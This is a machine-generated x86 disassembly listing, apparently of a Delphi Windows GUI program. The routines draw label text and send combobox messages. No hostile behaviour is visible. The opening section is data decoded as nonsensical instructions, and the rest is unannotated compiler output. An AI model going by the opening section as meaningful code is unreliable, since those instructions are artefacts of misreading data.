bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
fiadd [ ebp ]
jl r-xdata
loopne r-xdata
jo r-xdata
0xd80044 0xff00
je r-xdata
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
fadd [ eax ]
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop ebp
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x20 ] bp
pushfd
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax + 0x4f07002b ] al
add [ eax ] al
dec edi
jbe r-xdata
add [ eax + 0x9 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
adc [ eax ] al
push edi
add [ eax ] al
call esp
out 0x44 eax
add bh bh
insb
call sub_451ffc
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
0xe00044 0xff00
0xd00044 0xff00
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
popad
dec ebp
outsd
jbe r-xdata
inc eax
add [ eax ] eax
rol [ ecx ] 0x0
inc esp
add al ah
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
jns r-xdata
je r-xdata
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
pop ebp
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
push ebx
je r-xdata
push ebp
jo r-xdata
arpl [ ebx - 0x68 ] bp
pushfd
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
inc esp
outsd
ja r-xdata
insb
or [ gs : edx + 0x56 ] ebp
imul esi [ edx + 0x74 ] 0x126c6175
insb
bound edx [ esi + 0x69 ]
outsd
js r-xdata
outsb
push ebx
je r-xdata
dec edi
dec esp
add [ eax ] al
jmp eax
sub [ ebx + 0x1e80044 ] bl
add bh bh
call 0x2432217
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002f ] al
add [ eax ] eax
jmp eax
fwait
inc esp
add al bl
add [ eax ] eax
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
[ eax ] al
pushfd
popad
outsb
popad
jb r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
sahf
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
adc ch [ edx + 0x56 ]
imul esi [ edx + 0x74 ] 0x4f6c6175
jb r-xdata
add bh bh
les ebx [ edx + 0xd80044 ]
adc eax 0x47424c54
jne r-xdata
ja r-xdata
popad
je r-xdata
loopne r-xdata
outsd
outsb
je r-xdata
outsb
or [ edi ] al
adc [ edx + 0x4f ] ch
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
je r-xdata
inc esp
jb r-xdata
push 0x65
popad
je r-xdata
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax + edx + 0x408d0040 ] dl
add [ ebx + 0x15080044 ] bh
push esp
dec esp
inc edx
inc edi
insb
dec edi
je r-xdata
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
call 0xa44672b
insb
bound edx [ ebx + 0x74 ]
popad
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94320f4
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0026 ] al
outsb
inc esp
add [ eax ] cl
push ebx
je r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
add ecx [ eax ]
pop es
js r-xdata
outsd
outsb
je r-xdata
jb r-xdata
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
ja r-xdata
popad
jb r-xdata
inc esp
outsd
je r-xdata
jb r-xdata
inc ebx
je r-xdata
jb r-xdata
nop
in al dx
and al [ eax + eax + 0x3 ]
inc esp
outsb
je r-xdata
inc esp
popad
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x76 ] si
outsb
hlt
imul ebp [ esi + 0x67 ] 0x72745306
outsb
outsd
insb
add [ 0x65646e49 ] al
or [ edx ] ecx
inc esp
dec ecx
outsb
je r-xdata
popad
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
and eax [ fs : eax + eax + 0x8 ]
andps xmm1 [ edx + eax * 2 + 0x47 ]
je r-xdata
push esp
dec esp
inc edx
inc edi
imul edi [ eax + 0x65 ] 0x626c1364
dec edi
ja r-xdata
inc esp
popad
bound ebp [ ebp + 0x9 ]
insb
bound edx [ esi + 0x69 ]
jb r-xdata
je r-xdata
jb r-xdata
lea eax [ eax ]
mov esp 0x8004423
ja r-xdata
inc ebp
jbe r-xdata
insb
jae r-xdata
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
add cl [ eax ]
pop es
add [ edx + eax ] bh
add al bh
mov ah 0x44
add ah ch
add [ eax ] al
shl [ 0x263a0044 ] cl
inc ebp
jbe r-xdata
add ecx [ eax ]
pop es
inc ebx
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ esp + ebp ] ch
inc esp
adc [ eax ] al
add [ eax - 0x54 ] ch
inc esp
add [ eax + edx + 0x408d0040 ] dl
add al al
and al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
and eax 0x26500044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dl
and eax 0x263a0044
inc ebp
add ah dh
xchg edx eax
inc ecx
jb r-xdata
jb r-xdata
arpl [ eax + eax + 0x68 ] si
lodsb [ esi ]
inc esp
add [ eax + edx ] bh
inc eax
add [ ecx + edx ] al
inc eax
add [ ebx + 0x442420c0 ] cl
dec edi
bound ebp [ edx + 0x65 ]
pop es
dec ecx
outsb
je r-xdata
jb r-xdata
popad
je r-xdata
add [ esp + eax * 2 ] eax
dec ecx
outsb
xchg esp eax
adc [ eax ] al
popad
je r-xdata
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ gs : edi + eax + 0x54 ] si
push es
inc eax
add [ ebp + 0x23bc0040 ] cl
inc esp
add [ eax ] cl
jne r-xdata
add al 0x44
mov eax eax
push ebx
je r-xdata
outsb
or eax 0x73694c54
je r-xdata
inc esp
add [ ebx ] al
shl [ ebx + 0x44 ] 0x0
or [ edi ] cl
inc ebp
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax ] cl
inc esp
xor eax 0x2c2c0040
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
arpl [ edi + eax + 0x54 ] si
or al [ ecx + 0x74 ]
popad
inc ebp
jbe r-xdata
jb r-xdata
add [ eax ] cl
adc [ esp + ecx * 2 + 0x42 ] dl
inc esi
imul ebp [ esi + 0x64 ] 0x61746144
adc [ eax ] eax
mov eax eax
and [ esp + eax * 2 ] ah
imul ebp [ esi + 0x67 ] 0x44ac6800
push ebx
je r-xdata
insb
add ah cl
pop ebx
inc ebp
add ah dh
and eax [ ebp ]
hlt
xor al [ eax ]
or [ edi + 0x44 ] ah
outsd
insb
add [ edx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x69727453
outsb
push es
push ebx
je r-xdata
js r-xdata
ja r-xdata
add [ eax - 0x7bffbaf7 ] cl
fld [ eax + eax - 0x58 ]
adc [ ebp ] al
pushfd
out 0x44 al
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ esi ] bl
inc esp
add al ah
push esi
inc ebp
add ah bh
pop ebx
inc ebp
add [ eax + 0x5b ] cl
inc ebp
add al bh
fild [ eax + eax + 0x5c ]
push ecx
inc ebp
add [ ecx + edx * 2 + 0x45 ] bh
add [ esi + ecx * 2 - 0x24bfffbb ] dl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + 0xb ] bl
inc ebp
add [ ebx + ecx - 0x197bffbb ] al
inc esp
add [ esp + ebx * 8 - 0x17efffbc ] bh
inc esp
add [ eax - 0x63ffbb19 ] cl
0xe9480044 0x44
imul ebp [ esi + 0x67 ] 0x746e4907
sub_443960
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_456d7c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_44e070
mov edx 0x69
mov eax esi
call sub_44e094
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_4439bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451120
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_4259ec
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_425948
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_443a28
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_443dca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_4259ec
call sub_43f31c
call sub_43f3fc
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_425948
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_44e8b4
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_41766c
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_41766c
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_44e8b4
mov eax [ ebp - 0x54 ]
call sub_4043d8
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_44e8b4
mov eax [ ebp - 0x58 ]
call sub_4045d8
push eax
mov eax edi
call sub_425acc
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_41766c
mov eax ebx
mov si 0xffc8
call sub_403518
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_4252cc
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_4252cc
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4256ac
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_4252cc
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_425acc
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443dd1
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_40413c
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp - 0x60 ]
call sub_4047f8
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_40413c
retn
mov eax ebx
mov si 0xffc8
call sub_403518
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_4256ac
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_44e8b4
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_44e8b4
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_42592c
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_41766c
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_41766c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_44e8b4
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404944
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_425acc
push eax
call sub_43f31c
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43f564
jmp r-xdata
call sub_43f31c
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_43f5c8
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_425acc
push eax
call sub_43f31c
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43f4b8
push 0x0
mov eax edi
call sub_425acc
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_44e8b4
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_450bac
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_44e8b4
mov eax [ ebp - 0x80 ]
call sub_4043d8
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_44e8b4
mov eax [ ebp - 0x84 ]
call sub_4045d8
push eax
mov eax edi
call sub_425acc
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_4252cc
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_44e8b4
mov eax [ ebp - 0x88 ]
call sub_4043d8
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_44e8b4
mov eax [ ebp - 0x8c ]
call sub_4045d8
push eax
mov eax edi
call sub_425acc
push eax
call DrawTextA
sub_443ddb
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_443e56
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44e8b4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_465758
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_454538
mov eax ebx
mov si 0xffb8
call sub_403518
test al al
je r-xdata
mov eax ebx
call sub_455614
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443e5d
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_443ea8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4562fc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_44e070
mov edx 0x11
mov eax esi
call sub_44e094
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_43f31c
call sub_43f3fc
test al al
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_443f54
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4440aa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450bac
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_4259ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4043e0
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4043d8
push eax
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x160 ]
call sub_425acc
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_424b00
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4043d8
push eax
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x160 ]
call sub_425acc
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_424b00
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4043d8
push eax
mov eax [ ebp - 0x4 ]
call sub_4045d8
push eax
mov eax [ ebx + 0x160 ]
call sub_425acc
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4440b1
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_4440bb
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_4442e4
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_4253e8
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_4252cc
xor edx edx
mov eax [ esi + 0x14 ]
call sub_4253e8
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_425670
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403518
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403518
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_4441dc
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_425b4c
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403518
xor edx edx
mov eax [ edi + 0x160 ]
call sub_425b4c
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403518
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_44b694
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_444320
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4442e4
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_444380
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403518
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4443a8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44dd84
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_44440c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_444499
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4444a0
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44e8b4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_465758
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403518
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_44450c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_444572
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push edi
push 0x150
mov eax [ ebx + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444579
lea eax [ ebp - 0x4 ]
call sub_404118
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_41a114
sub_444584
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x151
mov eax [ ebx + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4445a8
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
push 0x0
push edi
push 0x149
mov eax [ ebx + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax esi
xor edx edx
call sub_404764
mov edx esi
xchg edx eax
call sub_404764
mov eax [ esi ]
call sub_4045d8
push eax
push edi
push 0x148
mov eax [ ebx + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_444600
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_444664
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_44e8b4
push 0x0
push 0x0
push 0x14b
mov eax [ ebx + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_44e8e4
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44466b
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_444690
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4045d8
push eax
push 0xffffffff
push 0x158
mov eax [ ebx + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_4446b8
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_4550b4
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_44edf0
sub_4446ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_450de0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x91
mov eax ebx
call sub_44e070
mov edx 0x19
mov eax ebx
call sub_44e094
mov dl 0x1
mov eax ebx
call sub_4552e8
xor edx edx
